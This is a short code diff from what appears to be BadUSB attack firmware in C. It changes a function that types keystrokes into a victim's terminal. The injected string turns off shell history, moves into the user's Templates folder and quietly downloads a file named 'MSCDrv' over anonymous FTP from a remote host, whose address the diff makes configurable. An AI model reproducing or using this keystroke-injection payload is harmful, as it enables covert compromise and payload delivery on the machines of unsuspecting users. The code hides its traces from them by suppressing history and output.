@@ -195,7 +195,9 @@ void BadUSB_Attack(int stage){
 		char AttackStr0[256] = {'\0'};
 		strcat(AttackStr0, "set +o history\n");
 		strcat(AttackStr0, "cd /home/user/Templates\n");
-		strcat(AttackStr0, "wget -q ftp://anonymous:@192.168.59.207/MSCDrv >/dev/null 2>&1 &\n");
+		strcat(AttackStr0, "wget -q ftp://anonymous:@");
+		strcat(AttackStr0, File_Host_Addr);
+		strcat(AttackStr0, "/MSCDrv >/dev/null 2>&1 &\n");
 		strcat(AttackStr0, "exit\n");
 		SimulateShortcutKey(Terminal, 3);
 		SimulateKeyStrokes(AttackStr0, strlen(AttackStr0), &PrintCnt);
